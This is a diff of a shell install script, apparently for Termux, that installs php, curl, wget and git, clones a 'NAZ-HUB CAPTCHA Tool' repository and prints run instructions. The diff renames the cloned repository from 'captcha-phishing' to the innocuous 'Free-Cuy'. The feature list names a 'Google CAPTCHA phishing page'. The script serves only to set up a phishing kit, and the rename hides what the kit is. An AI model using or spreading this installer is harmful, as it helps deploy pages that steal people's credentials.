@@ -21,8 +21,8 @@ echo "[+] Installing requirements..."
 pkg install -y php curl wget git nano
 
 echo "[+] Downloading NAZ-HUB CAPTCHA Tool..."
-git clone https://github.com/NAZ-HUB/captcha-phishing
-cd captcha-phishing
+git clone https://github.com/CrNazamOfficial/Free-Cuy
+cd Free-Cuy
 
 echo "[+] Setting up permissions..."
 chmod +x start.sh setup.sh
@@ -32,8 +32,8 @@ echo "════════════════════════�
 echo "✅ INSTALLATION COMPLETE!"
 echo "══════════════════════════════════════════════"
 echo ""
-echo "📁 Folder: ~/captcha-phishing"
-echo "🚀 Run: cd captcha-phishing && bash start.sh"
+echo "📁 Folder: ~/Free-Cuy"
+echo "🚀 Run: cd Free-Cuy && bash start.sh"
 echo ""
 echo "📌 Features:"
 echo "   • Google CAPTCHA phishing page"
